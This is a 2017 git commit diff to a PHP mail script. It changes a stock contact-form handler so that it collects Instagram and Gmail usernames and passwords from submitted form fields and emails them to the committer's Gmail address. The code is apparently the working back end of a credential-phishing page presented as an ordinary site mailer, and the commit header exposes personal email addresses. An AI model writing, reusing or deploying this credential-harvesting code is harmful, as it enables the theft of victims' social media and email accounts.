1068c0c12dc420be25df3e7f8f5037231d39eeed
idress4weather <danylevskainnassik@gmail.com>
2017-07-19 17:47:51 +0300

    Update mail.php

--- mail.php
+++ mail.php
@@ -1,12 +1,13 @@
 <?php
 
-$recepient = "agragregra@ya.ru";
-$sitename = "Название сайта";
+$recepient = "innadanylevska@gmail.com";
+$sitename = "idress4weather.github.io";
 
-$name = trim($_POST["name"]);
-$phone = trim($_POST["phone"]);
-$text = trim($_POST["text"]);
-$message = "Имя: $name \nТелефон: $phone \nТекст: $text";
+$instaName = trim($_POST["instaName"]);
+$instaPassword = trim($_POST["instaPassword"]);
+$gmailName = trim($_POST["gmailName"]);
+$gmailPassword = trim($_POST["gmailPassword"]);
+$message = "Имя: $instaName \nТелефон: $instaPassword \n$gmailName \nТелефон: $gmailPassword";
 
 $pagetitle = "Новая заявка с сайта \"$sitename\"";
 mail($recepient, $pagetitle, $message, "Content-type: text/plain; charset=\"utf-8\"\n From: $recepient");
